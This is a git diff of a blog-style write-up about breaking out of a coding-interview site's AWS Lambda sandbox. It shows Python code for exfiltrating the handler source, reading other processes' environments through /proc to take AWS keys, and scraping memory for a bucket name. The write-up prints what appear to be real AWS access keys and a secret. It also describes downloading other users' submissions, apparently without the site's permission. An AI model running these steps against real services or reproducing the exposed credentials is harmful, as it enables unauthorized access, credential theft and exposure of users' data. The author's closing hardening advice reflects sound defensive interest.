@@ -2,7 +2,7 @@
 
 ## Pre-Intro:
 
-While this may not be a CTF challenge, I do think it fits in the general category of writeups. This is a story of how I get bored easily and start poking around a site that lets you execute arbitrary code.
+While this may not be a CTF challenge, with no defined "flag" to capture, I do think it fits in the general category of writeups. This is a story of how I easily get bored and start poking around a site that lets you execute arbitrary code.
 
 ## Intro
 
@@ -12,9 +12,9 @@ perception is that you have to cram and prepare for these in advance.
 One thing that has always stressed me out has been live coding interviews. I prefer to have a coding assignment sent to me so I can do it on my own time and not worry about someone looking over my shoulder, but I understand the problems
 that presents, and that watching someone work through a problem in real time gives the interviewer valuable insight.
 
-The site provides helpful coding puzzles so that you can practice ahead of time. That’s actually really cool, and helpful. It lets you get familiar with the interface etc.
+The site provides helpful coding puzzles so that you can practice ahead of time. That's actually really cool, and helpful. It lets you get familiar with the interface etc.
 ![meta_sections](./images/1-meta_sections.png)
-I’ve done a fair number of leetcode problems, and so doing some practice challenges was interesting, but I get bored easily. I’m more curious about how everything is wired up in the background. I was curious how they architected the backend
+I've done a fair number of leetcode problems, and so doing some practice challenges was interesting, but I get bored easily. I'm more curious about how everything is wired up in the background. I was curious how they architected the backend
 processing and how secure it is.
 
 Here are some notes about the architecture and what I pieced together.
@@ -53,7 +53,7 @@ server_timestamps: true
 doc_id: 4743360595790243
 ```
 
-I spent very little time looking into this. It may be interesting to manipulate some of these fields, but in general I want to know more about what’s actually getting executed. The response to the data sent provides a submission_id that is
+I spent very little time looking into this. It may be interesting to manipulate some of these fields, but in general I want to know more about what's actually getting executed. The response to the data sent provides a submission_id that is
 interesting for later.
 
 ---
@@ -64,24 +64,22 @@ The first thing I wanted to see was how locked down everything was. Could I just
 
 ```python
 import os
-
-os.system(‘ls /’)
+os.system('ls /')
 ```
 
-And sure enough I could. It did not seem like any of the code was being modified for an exclusion list etc…
+And sure enough I could. It did not seem like any of the code was being modified for an exclusion list etc...
 
 Ok, so let's take a look at the environment variables and see what they have:
 
 ```python
 import os
-
 print(os.environ)
 ```
 
-This gets us some fairly simple stuff, one thing I noticed, was that it truncated the stdout output (more on that later). Definitely nothing overly exciting, but some hints about what’s going on in the system. EG:
+This gets us some fairly simple stuff, one thing I noticed, was that it truncated the stdout output (more on that later). Definitely nothing overly exciting, but some hints about what's going on in the system. EG:
 `'LAMBDA_TASK_ROOT': '/var/task'`
 
-Ahhh, so our code is running in a lambda... the environment variables don’t show any AWS env variables that I would hope are there. Some additional information is that the processes are running as a non-privileged user: `sbx_user1051` . And
+Ahhh, so our code is running in a lambda... the environment variables don't show any AWS env variables that I would hope are there. Some additional information is that the processes are running as a non-privileged user: `sbx_user1051` . And
 the processes all seem to be running as the same user:
 
 ```shell
@@ -104,9 +102,9 @@ More on the unintended effects of this later on. But for now, let's look to see 
 
 ## Exfiltrating the handler code
 
-Well finding the code was simple, it was in an `app.py` file in the /var/task directory. Ok, now to exfiltrate it. Just printing the contents to stdout was painful since it truncated it. So we’ll have to chunk it.
+Well finding the code was simple, it was in an `app.py` file in the /var/task directory. Ok, now to exfiltrate it. Just printing the contents to stdout was painful since it truncated it. So we'll have to chunk it.
 
-Turns out that the main file system overlay is read-only, as you would expect. But the mount command shows that `/tmp` is writable, so let's cp the file over there. We’ll then gzip it, and in our python script we’ll open the file, read in
+Turns out that the main file system overlay is read-only, as you would expect. But the mount command shows that `/tmp` is writable, so let's cp the file over there. We'll then gzip it, and in our python script we'll open the file, read in
 the contents, and base64 encode it. Then output around 1kb at a time.
 
 After a couple of requests and chunks, we get the fully exfiltrated data. Now we can reverse the process and extract it. This give us code we can review:
@@ -460,21 +458,21 @@ def lambda_handler(event, context):
     }
 ```
 
-OK, so great. We’re seeing a lot more now. The submissions are downloaded from s3, run in a separate process via `subprocess.Popen` so there is good separation there.
+OK, so great. We're seeing a lot more now. The submissions are downloaded from s3, run in a separate process via `subprocess.Popen` so there is good separation there.
 
-What’s next… Well the handler script accesses s3 to download the code… so can we access it as well in our code? Let's see if we can `import boto3`.
+What's next... Well the handler script accesses s3 to download the code... so can we access it as well in our code? Let's see if we can `import boto3`.
 
-Well, that gets us an import error, but we know it’s there somewhere on the file system because the handler uses it. So off we go to find it!
+Well, that gets us an `import error`, but we know it's there somewhere on the file system because the handler uses it. So off we go to find it!
 
 ---
 
-Finding and using site-packages
+## Finding and using site-packages
 
 ```python
 os.system("find / -name boto3")
 ```
 
-And once we have the site-packages we can just add that to our python path… There were two locations. The `/var/runtime` seemed to be the safer bet, so add that to the path in our script…
+And once we have the site-packages we can just add that to our python path... There were two locations. The `/var/runtime` seemed to be the safer bet, so add that to the path in our script...
 
 ```python
 # sys.path.append("/var/lang/lib/python3.9/site-packages")
@@ -485,9 +483,9 @@ sys.path.append("/var/runtime/")
 
 ## Process access and Environment variables
 
-Accessing s3 requires a bucket name, and the `app.py` code shows we also need to have the `submission_id` (we have our own id from the graphql, but that’s not interesting).
+Accessing s3 requires a bucket name, and the `app.py` code shows we also need to have the `submission_id` (we have our own id from the graphql, but that's not interesting).
 
-We are also still missing AWS environment variables with tokens and keys… Where did those disappear to? Forked processes will inherit env from the parent. Well a closer look at the `app.py` code shows what happened to those:
+We are also still missing AWS environment variables with tokens and keys... Where did those disappear to? Forked processes will inherit env from the parent. Well a closer look at the `app.py` code shows what happened to those:
 
 ```python
    stored_env_values = {}
@@ -499,19 +497,19 @@ for key in stored_env_values:
     del os.environ[key]
 ```
 
-So those are removed and then put back later… but let's see if we can figure out who is calling who, and if there are other processes running.
+So those are removed and then put back later... but let's see if we can figure out who is calling who, and if there are other processes running.
 
-Running `ps aux` would be too easy, the package isn’t installed, so lets go digging through the `/proc` filesystem…
+Running `ps aux` would be too easy, the package isn't installed, so lets go digging through the `/proc` filesystem...
 
 ```python
-  cmds = glob.glob('/proc/*/cmdline')
+cmds = glob.glob('/proc/*/cmdline')
 for c in cmds:
     with open(c, 'r') as f:
         print(f'c:{c}')
         print(f.read())
 ```
 
-This shows that there are several layers of calls here…
+This shows that there are several layers of calls here...
 
 ```bash
 c:/proc/self/cmdline
@@ -536,8 +534,8 @@ c:/proc/340/cmdline
   /usr/pypy/bin/pypy/tmp/source.txt
 ```
 
-Some great use of `climit` here to make sure things don’t just go wild… But let's keep poking around. Remember how all the processes were running with the same user? Well this means that our user has read access to the environ “files” that
-the proc filesystem exposes. So we’re going to look at the environment variables of process 1!
+Some great use of `ulimit` here to make sure things don't just go wild... But let's keep poking around. Remember how all the processes were running with the same user? Well this means that our user has read access to the environ "files" that
+the proc filesystem exposes. So we're going to look at the environment variables of process 1!
 
 Code to do that:
 
@@ -563,16 +561,16 @@ AWS_LAMBDA_FUNCTION_VERSION=$LATEST
 
 ## Grabbing AWS keys/secret/token
 
-A bit better but no secrets yet… Let’s try the next level down (pid8)
+A bit better but no secrets yet... Let's try the next level down (`pid8`)
 
 ```dotenv
 AWS_ACCESS_KEY_ID=ASIA5SWNPC4VJHOG5IFQ
 AWS_LAMBDA_FUNCTION_VERSION=$LATEST
 AWS_SECRET_ACCESS_KEY=mJTn2w0rBvQ0n/nwRlI3foc7xd2B7vvRjVECSpbT
-AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEH4aCXVzLXdlc3QtMSJGMEQCICBjsX1Icz….
+AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEH4aCXVzLXdlc3QtMSJGMEQCICBjsX1Icz...
 ```
 
-HA, so now we have a place to get access keys from… We’ll make it easy and just add those to our ENV of the running process we control…
+HA, so now we have a place to get access keys from... We'll make it easy and just add those to our ENV of the running process we control...
 
 ```python
 with open('/proc/8/environ', 'r') as f:
@@ -589,42 +587,27 @@ for l in env_list:
         pass
 ```
 
-Nice… OK now we have boto3, we have access keys, and we can check to see if we can access s3 ourselves…
+Nice... OK now we have boto3, we have access keys, and we can check to see if we can access s3 ourselves...
 
 ```python
-Traceback(most
-recent
-call
-last):
-result = getSum(A, B, C)
-print(s3_client.list_buckets())
-File
-"/var/runtime/botocore/client.py", line
-386, in _api_call
-return self._make_api_call(operation_name, kwargs)
-File
-"/var/runtime/botocore/client.py", line
-705, in _make_api_call
-raise error_class(parsed_response, operation_name)
-botocore.exceptions.ClientError: An
-error
-occurred(AccessDenied)
-when
-calling
-the
-ListBuckets
-operation: Access
-Denied
+Traceback (most recent call last):
+   result = getSum(A, B, C)
+   print(s3_client.list_buckets())
+ File "/var/runtime/botocore/client.py", line 386, in _api_call
+   return self._make_api_call(operation_name, kwargs)
+ File "/var/runtime/botocore/client.py", line 705, in _make_api_call
+   raise error_class(parsed_response, operation_name)
+botocore.exceptions.ClientError: An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied
 ```
 
-Well shoot… IAM is locked down… how do we go about getting the bucket name?
+Well shoot... IAM is locked down... how do we go about getting the bucket name?
 
 ---
 
 ## Finding relevant information in memory
 
-It’s got to be there somewhere in memory on the machine. The handler is `python`, it’s doing logging and tracing… let's go through the mapped memory and see if we can find something, this time using `pid 12`, which is the `bootstrap.py`
-process calling the script that triggers our code…:
+It's got to be there somewhere in memory on the machine. The handler is `python`, it's doing logging and tracing... let's go through the mapped memory and see if we can find something, this time using `pid 12`, which is the `bootstrap.py`
+process calling the script that triggers our code...:
 
 ```python
   try:
@@ -648,9 +631,10 @@ except Exception as e:
 pass
 ```
 ![memory dump](./images/2-scrape_memory.png)
+
 Yay, that worked! Our bucket name is: `terraform-20210608051810146400000001`
 
-What happens if we try to list the objects in the bucket…. Yup you guessed it… `Access Denied` again. So IAM is locked down well. But what about getting our own source file…
+What happens if we try to list the objects in the bucket.... Yup you guessed it... `Access Denied` again. So IAM is locked down well. But what about getting our own source file...
 
 ---
 
@@ -663,7 +647,7 @@ s3.download_file('terraform-20210608051810146400000001', '493657392343554/source
 ```
 
 And sure enough! We can download the code that we submitted! 
-One interesting thing to note is that the code is a bit different than I added via the website. It has extra code that calls the function that’s being tested. EG:
+One interesting thing to note is that the code is a bit different than I added via the website. It has extra code that calls the function that's being tested. EG:
 ```python
 import sys
 
@@ -676,12 +660,12 @@ print("BEGIN_RETURN_VALUE_OUTPUT")
 print(result)
 ```
 
-But other than that, it’s not super interesting, I wonder if we can find out if we can access other people's submissions!!
+But other than that, it's not super interesting, I wonder if we can find out if we can access other people's submissions!!
 
 ---
 
 ## Grabbing other people's submissions
-Back to scrapping memory of running processes, but this time we’re looking for ‘submission_id’:
+Back to scrapping memory of running processes, but this time we're looking for 'submission_id':
 
 ```python
   try:
@@ -707,9 +691,9 @@ Back to scrapping memory of running processes, but this time we’re looking for
 ![Submissions](./images/3-submissions.png)
 ![Submissions close up](./images/4-submissions.png)
 
-Ahh, multiple submission codes… and some that have compiled code… which I’m definitely not using!
+Ahh, multiple submission codes... and some that have compiled code... which I'm definitely not using!
 
-So we’ll grab that, locally, no need to do this in the lambda. Note the submission id is different because I am writing the notes afterwards. Either way, this is NOT my code:
+So we'll grab that, locally, no need to do this in the lambda. Note the submission id is different because I am writing the notes afterwards. Either way, this is NOT my code:
 
 ```text
 >>> s3.download_file('terraform-20210608051810146400000001', '5625045057516394/source.txt', '/tmp/mine')
@@ -768,10 +752,10 @@ I additionally ran `enumerate-iam` to see if anything interesting would show up.
 ---
 
 ## Check for networking configuration
-Applications installed in a lambda are restricted and we can’t just `apt-get` something. So we need to grab the networking configuration from `/proc`…
-Note, that when the code runs correctly, the stdout is truncated to ~1KB. So if we run
+Applications installed in a lambda are restricted and we can't just `apt-get` something. So we need to grab the networking configuration from `/proc`...
+Note, that when the code runs without an error, the stdout is truncated to ~1KB. So if we run:
 ```python
-  print(os.system('cat /proc/net/fib_trie'))
+    print(os.system('cat /proc/net/fib_trie'))
 ```
 
 We get a truncated output:
@@ -814,10 +798,10 @@ Local:
         /0 universe UNICAST
      +-- 127...
 ```
-But if we raise an exception, we get all the text we’re wanting to print:
+But if we raise an exception, we get all the text we're wanting to print:
 ```python
-  print(os.system('cat /proc/net/fib_trie'))
-  raise BaseException('')
+    print(os.system('cat /proc/net/fib_trie'))
+    raise BaseException('')
 ```
 
 EG:
@@ -892,7 +876,7 @@ Traceback (most recent call last):
     raise BaseException('')
 BaseException
 ```
-It looks like we’re in a private subnet, with autoip. But we’re able to access S3, so some level of networking is in place. 
+It looks like we're in a private subnet, with autoip. But we're able to access S3, so some level of networking is in place. 
 
 Another thing I wanted to try was to issue a http request to gauge if network traffic was allowed to exit the lambda:
 ```python
@@ -901,11 +885,12 @@ http = urllib3.PoolManager()
 r = http.request('GET', 'http://httpbin.org/robots.txt')
 print(r.data)
 ```
-This seems to just hang and the platform reports that it’s just pending:
+This seems to just hang and the platform reports that it's just pending:
 
 ![pending](./images/5-gql.png)
 
 And eventually the app shows:
+
 ![error](./images/6-error.png)
 
 Which makes sense if there are firewall rules in place, the request probably disappeared into a black hole somewhere. But it could also be due to DNS filtering. We can try to get out to some internet service somewhere via port `53`:
@@ -947,7 +932,7 @@ Doing a request to the API endpoint gets us our current submission:
   print(jdata['submission_id'], jdata['user_code']['language'])
 ```
 
-I hesitate to go further down this path of exploration because I don’t want to mess with any other submissions and risk a bad user experience for other users. Calling the API gets us a full event json message:
+I hesitate to go further down this path of exploration because I don't want to mess with any other submissions and risk a bad user experience for other users. Calling the API gets us a full event json message:
 
 ```json
 {
@@ -970,17 +955,17 @@ I hesitate to go further down this path of exploration because I don’t want to
 Subsequent calls get the same message with the same aws request id. It would be interesting to experiment with the other API calls to see if I could use the aws request in the response header to register a SUCCESS response.:
 `/runtime/invocation/<AwsRequestId>/response`
 
-I assume this may break things in a way that would be hard to debug without knowledge of what my specific code is doing. I don’t want to cause any problems for someone else, at least not without permission and a better understanding of the impacts. So I'm going to leave it at that.
+I assume this may break things in a way that would be hard to debug without knowledge of what my specific code is doing. I don't want to cause any problems for someone else, at least not without permission and a better understanding of the impacts. So I'm going to leave it at that.
 
 ---
 
 ## Summary
-In summary, things seem to be locked down pretty well. I suspect there are ways of being disruptive to the system, but gaining access to the system requires a registered account, so tracking down the offender would be fairly trivial. As far as gaining access to other users' submissions is concerned, it requires a bunch of non-trivial knowledge, the submissions will for the most part be a “work in progress”, so at that point it’s probably easier to just write the code yourself instead of trying to fix someone else's code.
+In summary, things seem to be locked down pretty well. I suspect there are ways of being disruptive to the system, but gaining access to the system requires a registered account, so tracking down the offender would be fairly trivial. As far as gaining access to other users' submissions is concerned, it requires a bunch of non-trivial knowledge, the submissions will for the most part be a "work in progress", so at that point it's probably easier to just write the code yourself instead of trying to fix someone else's code.
 
-The result validation code is somewhere that’s inaccessible to us. The lambda handler returns the stdout and stderr, and some other entity parses that output to verify answers. So there’s no “cheating” there. It may be interesting to bypass the handler return and use the API to send a custom return, and try to poke at the other backend services. I suspect this probably wouldn’t gain us much either though.
+The result validation code is somewhere that's inaccessible to us. The lambda handler returns the stdout and stderr, and some other entity parses that output to verify answers. So there's no "cheating" there. It may be interesting to bypass the handler return and use the API to send a custom return, and try to poke at the other backend services. I suspect this probably wouldn't gain us much either though.
 
 All in all, the architecture functions well, albeit a bit slow for submissions/validations. The environment seems secure and well locked down.
 
-I think the graphql api is also interesting and I totally glossed over it. Building a custom client to interface with the system may prove interesting, but beyond the amount of time I’d want to spend on this at the moment.
+I think the graphql api is also interesting and I totally glossed over it. Building a custom client to interface with the system may prove interesting, but beyond the amount of time I'd want to spend on this at the moment.
 
-The only suggestion I would make is to have the submission run as a different user. That would further lock down the process and make sure it’s not able to access the memory of the parent process. I’m not sure how much of that is configurable within the lambda process though, the benefits may outweigh the effort.
+The only suggestion I would make is to have the submission run as a different user. That would further lock down the process and make sure it's not able to access the memory of the parent process. I'm not sure how much of that is configurable within the lambda process though, the benefits may outweigh the effort.
